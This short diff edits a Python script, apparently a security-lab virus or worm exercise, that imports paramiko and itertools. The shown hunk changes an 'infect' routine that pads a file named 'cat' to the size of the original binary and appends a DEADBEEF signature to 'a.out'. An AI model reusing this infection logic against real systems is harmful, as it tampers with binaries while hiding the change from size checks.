@@ -1,3 +1,4 @@
+#!/usr/bin/env python3
 import itertools
 import paramiko
 import time
@@ -64,11 +65,14 @@ def modify():
 
     infect = open('cat', 'a')
     concat = ''
-    enlarge_size = cat_size - infect_size - 8
+    enlarge_size = cat_size - infect_size - 4
     for i in range(enlarge_size):
         concat += 'a'
-    concat += 'deadbeaf'
     infect.write(concat)
+    infect.close()
+    infect = open('a.out', 'ab+')
+    w = b"\xde\xad\xbe\xef"
+    infect.write(w)
     infect.close()
 
 if __name__ == '__main__':
